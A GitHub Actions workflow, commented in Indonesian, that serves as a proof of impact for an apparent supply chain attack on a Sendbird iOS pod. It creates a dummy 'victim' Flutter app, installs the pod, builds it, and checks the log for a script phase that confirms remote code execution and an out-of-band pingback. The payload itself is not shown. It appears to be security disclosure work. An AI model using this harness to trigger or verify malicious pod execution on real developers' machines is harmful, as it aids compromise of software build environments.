name: Sendbird Supply Chain Impact Proof
on: workflow_dispatch

jobs:
  verify_rce:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter/iOS Environment
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Replicate Customer Integration
        run: |
          # 1. Inisialisasi project dummy murni iOS
          mkdir sendbird_victim && cd sendbird_victim
          flutter create . --platforms=ios
          
          cd ios
          # 2. Setup Podfile: Aktifkan platform iOS 15 (Sesuai spec Sendbird)
          # Kita pake sed buat uncomment baris platform
          sed -i '' "s/# platform :ios, '12.0'/platform :ios, '15.0'/" Podfile
          
          # 3. Inject Target Pod ke dalam blok target 'Runner'
          # Ini KRUSIAL: Pod harus ada di dalam blok target 'Runner' agar tervalidasi
          sed -i '' "/target 'Runner' do/a\\
            pod 'SendbirdAIAgentMessenger', '5.1.0'\\
          " Podfile
          
          echo "=== Preview Podfile ==="
          cat Podfile

          # 4. Trigger Installation
          # Kita pake --repo-update buat mastiin CDN Trunk narik versi 5.1.0 lu
          pod install --repo-update || exit 1
          
          # 5. THE SMOKING GUN: Trigger Build
          # Kita pake --verbose buat liat output shell script dari script_phase lu
          echo "=== Launching Build to Trigger RCE ==="
          flutter build ios --no-codesign --verbose 2>&1 | tee build.log || true
          
          # 6. Final Audit Log
          echo "=== Checking for Payload Execution in Logs ==="
          # Grep nama script_phase yang lu buat di podspec
          if grep -q "Messenger UI Audit" build.log; then
            echo "✅ RCE SUCCESS: Payload 'Messenger UI Audit' detected in build logs!"
            echo "Check your OAST for the incoming pingback."
          else
            echo "❌ RCE FAILED: Script phase execution not found in logs."
            exit 1
          fi
